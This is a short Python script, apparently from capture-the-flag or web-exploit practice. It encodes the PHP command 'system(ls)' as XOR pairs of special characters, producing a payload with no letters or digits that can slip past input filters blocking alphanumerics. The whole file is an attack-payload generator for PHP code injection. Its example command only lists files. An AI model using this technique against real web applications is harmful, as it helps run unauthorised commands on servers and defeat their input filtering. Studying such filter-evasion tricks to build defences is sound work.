caracteres_speciaux = ["!", "#", "$", "%", "&", "(", ")", "*", "+", ",", "-", ".", "/", ":", ";","<", "=", ">", "?", "@", "[", "]", "^", "_", "`", "{", "|", "}", "~"]

commande='system(ls)'
commande_xor='$_++;'
count=0
for letter in commande:
    if letter=='(':
        commande_xor+=';$__('
        count=3
    elif letter==')':
        commande_xor+=');'
    else:
        if count==0:
            commande_xor+='$__='
            
        elif count==1:
            commande_xor+="."
        count=1
        found=False
        for i in caracteres_speciaux:
            for j in caracteres_speciaux:
                chara=chr(ord(i)^ord(j))
                if letter==chara:
                    #print(f"{chara} : {i} {j}")
                    #print(f"(\"{i}\"^\"{j}\")")
                    commande_xor+="(\"{}\"^\"{}\")".format(i,j)
                    
                    found=True
                    break
            if found:
                break

print(commande_xor)
